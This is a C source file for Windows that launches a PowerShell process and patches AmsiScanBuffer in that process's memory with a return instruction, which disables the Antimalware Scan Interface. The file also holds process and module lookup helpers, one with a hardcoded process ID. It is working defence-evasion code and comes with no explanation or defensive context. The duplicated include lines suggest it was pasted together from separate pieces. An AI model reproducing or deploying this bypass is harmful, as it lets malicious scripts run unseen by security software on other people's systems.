#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

DWORD WINAPI GetProcessIdByName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;

	if (Process32First(hSnapshot, &pe))
	{
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return 0;
}

HANDLE WINAPI GetHandleByProcessId(DWORD dwProcessId, LPCTSTR lpszModule)

{

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 5424);

	if (hSnapshot != INVALID_HANDLE_VALUE) {
		MODULEENTRY32 pe32;
		pe32.dwSize = sizeof(MODULEENTRY32);
		Module32First(hSnapshot, &pe32);

		do
		{
			if (lstrcmpi(pe32.szModule, lpszModule) == 0)
			{
				CloseHandle(hSnapshot);
				return pe32.hModule;

			}
		} while (Module32Next(hSnapshot, &pe32));
	}
	CloseHandle(hSnapshot);
	return 0;

}

#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
int main() {
	STARTUPINFOA si = {0};
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);

	CreateProcessA(NULL, (LPSTR)"powershell -NoExit dir", NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi);

	HMODULE hAmsi = LoadLibraryA("amsi.dll");
	LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");

	Sleep(500);

	DWORD oldProtect;
	char patch = 0xc3;

	VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
	WriteProcessMemory(pi.hProcess, (LPVOID)pAmsiScanBuffer, &patch, sizeof(char),NULL);
	VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, oldProtect, NULL);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	FreeLibrary(hAmsi);
	return 0;

}